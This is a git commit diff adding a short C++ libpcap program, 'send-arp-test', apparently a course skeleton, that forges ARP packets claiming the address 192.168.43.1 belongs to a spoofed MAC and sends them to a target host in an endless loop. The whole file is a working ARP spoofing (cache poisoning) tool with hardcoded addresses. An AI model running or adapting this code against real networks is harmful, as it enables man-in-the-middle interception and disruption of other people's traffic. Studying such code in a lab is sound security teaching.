cf802e3f22eb8d2e91cc66a2aa9b8a9be10be30c
alertjjm <sdr2936@gmail.com>
2020-07-29 14:32:11 +0900

    First commit skeleton codes

---
+++ main.cpp
@@ -0,0 +1,56 @@
+#include <cstdio>
+#include <pcap.h>
+#include <unistd.h>
+#include "ethhdr.h"
+#include "arphdr.h"
+
+#pragma pack(push, 1)
+struct EthArpPacket {
+	EthHdr eth_;
+	ArpHdr arp_;
+};
+#pragma pack(pop)
+
+void usage() {
+	printf("syntax: send-arp-test <interface>\n");
+	printf("sample: send-arp-test wlan0\n");
+}
+
+int main(int argc, char* argv[]) {
+	if (argc != 2) {
+		usage();
+		return -1;
+	}
+
+	char* dev = argv[1];
+	char errbuf[PCAP_ERRBUF_SIZE];
+	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	if (handle == nullptr) {
+		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+		return -1;
+	}
+
+	EthArpPacket packet;
+
+	packet.eth_.dmac_ = Mac("d6:25:8b:7e:77:c3");
+	packet.eth_.smac_ = Mac("00:0c:29:6f:81:00");
+	packet.eth_.type_ = htons(EthHdr::Arp);
+
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet.arp_.pro_ = htons(EthHdr::Ip4);
+	packet.arp_.hln_ = Mac::SIZE;
+	packet.arp_.pln_ = Ip::SIZE;
+	packet.arp_.op_ = htons(ArpHdr::Request);
+	packet.arp_.smac_ = Mac("00:0c:29:6f:81:00");
+	packet.arp_.sip_ = htonl(Ip("192.168.43.1"));
+	packet.arp_.tmac_ = Mac("d6:25:8b:7e:77:c3");
+	packet.arp_.tip_ = htonl(Ip("192.168.43.140"));
+	while(1){
+		printf(".\n");
+		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+		if (res != 0) {
+			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		}
+	}
+	pcap_close(handle);
+}
